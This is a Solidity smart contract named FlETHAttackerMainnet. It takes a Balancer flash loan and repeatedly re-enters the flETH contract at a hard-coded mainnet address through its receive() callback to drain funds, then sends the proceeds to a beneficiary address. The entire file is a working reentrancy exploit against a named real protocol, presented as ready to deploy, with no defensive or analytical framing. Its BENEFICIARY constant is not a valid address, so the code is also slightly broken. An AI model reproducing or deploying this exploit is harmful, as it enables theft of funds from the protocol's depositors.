// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IFLETHStrategy {
    function balanceInETH() external view returns (uint256);
}

interface IFLETH {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 wethAmount) external payable;
    function withdraw(uint256 amount) external;
    function rebalance() external;
    function strategy() external view returns (IFLETHStrategy);
    function rebalanceThreshold() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlETHAttackerMainnet {
    IFLETH public constant flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);
    IBalancerVault public constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH public constant WETH = IWETH(0x4200000000000000000000000000000000000006);
    address public constant BENEFICIARY = 0x2770;
    uint256 public constant FLASHLOAN_AMOUNT = 100 ether;
    uint256 public constant MAX_CYCLES = 15;

    address public immutable deployer;
    bool public attackExecuted;
    bool private isExtracting;
    uint256 private cycleCount;

    uint256 public totalDeposited;
    uint256 public totalWithdrawn;
    uint256 public profitSecured;
    uint256 public netProfit;

    uint256[15] public keepPercentages = [
        10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80
    ];

    event AttackStarted(uint256 flashloanAmount);
    event CycleExecuted(uint256 cycle, uint256 received, uint256 kept, uint256 redeposited);
    event ProfitSecured(uint256 amount);
    event AttackCompleted(uint256 totalWithdrawn, uint256 profitSecured, uint256 netProfit);

    modifier onlyDeployer() {
        require(msg.sender == deployer, "Only deployer");
        _;
    }

    constructor() {
        deployer = msg.sender;
    }

    function executeAttack() external onlyDeployer {
        require(!attackExecuted, "Already executed");
        attackExecuted = true;

        emit AttackStarted(FLASHLOAN_AMOUNT);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASHLOAN_AMOUNT;
        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(balancerVault), "Only Balancer");
        require(feeAmounts[0] == 0, "Expected 0% fee");

        uint256 flashAmount = amounts[0];
        WETH.withdraw(flashAmount);

        isExtracting = true;
        cycleCount = 0;
        totalDeposited = 0;
        totalWithdrawn = 0;
        profitSecured = 0;

        _smartDeposit(flashAmount);

        uint256 ourFlETH = flETH.balanceOf(address(this));
        if (ourFlETH > 0) {
            flETH.withdraw(ourFlETH);
        }

        isExtracting = false;
        uint256 finalBalance = address(this).balance;
        if (finalBalance > flashAmount) {
            netProfit = finalBalance - flashAmount;
            profitSecured = netProfit;
            emit ProfitSecured(netProfit);
        }

        emit AttackCompleted(totalWithdrawn, profitSecured, netProfit);
        uint256 toRepay = flashAmount;
        if (address(this).balance < toRepay) {
            toRepay = address(this).balance;
        }

        WETH.deposit{value: toRepay}();
        WETH.transfer(address(balancerVault), toRepay);
        uint256 remaining = address(this).balance;
        if (remaining > 0) {
            (bool success,) = BENEFICIARY.call{value: remaining}("");
            require(success, "Transfer failed");
        }
    }

    function _smartDeposit(uint256 totalAmount) internal {
        uint256 totalSupply = flETH.totalSupply();
        uint256 threshold = flETH.rebalanceThreshold();
        uint256 currentBalance = address(flETH).balance;
        uint256 rebalanceLimit = (threshold * (totalSupply + totalAmount)) / 1 ether;

        if (currentBalance + totalAmount <= rebalanceLimit) {
            flETH.deposit{value: totalAmount}(0);
            totalDeposited = totalAmount;
        } else {
            uint256 remaining = totalAmount;
            uint256 chunkSize = 10 ether;

            while (remaining > 0 && cycleCount < 10) {
                uint256 toDeposit = remaining > chunkSize ? chunkSize : remaining;
                uint256 newBalance = address(flETH).balance;
                uint256 newSupply = flETH.totalSupply() + toDeposit;
                uint256 newThreshold = (threshold * newSupply) / 1 ether;

                if (newBalance + toDeposit > newThreshold) {
                    toDeposit = newThreshold > newBalance ? newThreshold - newBalance : 0;
                }

                if (toDeposit > 0) {
                    flETH.deposit{value: toDeposit}(0);
                    totalDeposited += toDeposit;
                    remaining -= toDeposit;
                    cycleCount++;
                } else {
                    break;
                }
            }
        }
    }

    receive() external payable {
        if (!isExtracting || msg.sender != address(flETH)) {
            return;
        }

        cycleCount++;
        if (cycleCount > MAX_CYCLES) {
            return;
        }

        uint256 received = msg.value;
        totalWithdrawn += received;

        uint256 keepPercentage = cycleCount < 15 ? keepPercentages[cycleCount - 1] : 80;
        uint256 toKeep = (received * keepPercentage) / 100;
        uint256 toRedeposit = received - toKeep;
        profitSecured += toKeep;
        emit CycleExecuted(cycleCount, received, toKeep, toRedeposit);
        if (toRedeposit > 0.1 ether && cycleCount < MAX_CYCLES) {
            flETH.deposit{value: toRedeposit}(0);
            totalDeposited += toRedeposit;

            uint256 newFlETH = flETH.balanceOf(address(this));
            if (newFlETH > 0) {
                try flETH.withdraw(newFlETH) {
                } catch {

                }
            }
        } else {
            emit ProfitSecured(profitSecured);
        }
    }

    function checkState() external view returns (
        uint256 flETHBalance,
        uint256 strategyBalance,
        uint256 totalSupply,
        uint256 ourBalance,
        uint256 ourFlETH,
        uint256 profit
    ) {
        flETHBalance = address(flETH).balance;
        strategyBalance = flETH.strategy().balanceInETH();
        totalSupply = flETH.totalSupply();
        ourBalance = address(this).balance;
        ourFlETH = flETH.balanceOf(address(this));
        profit = profitSecured;
    }

    function emergencyWithdraw() external onlyDeployer {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success,) = deployer.call{value: balance}("");
            require(success, "Emergency withdraw failed");
        }
    }
}
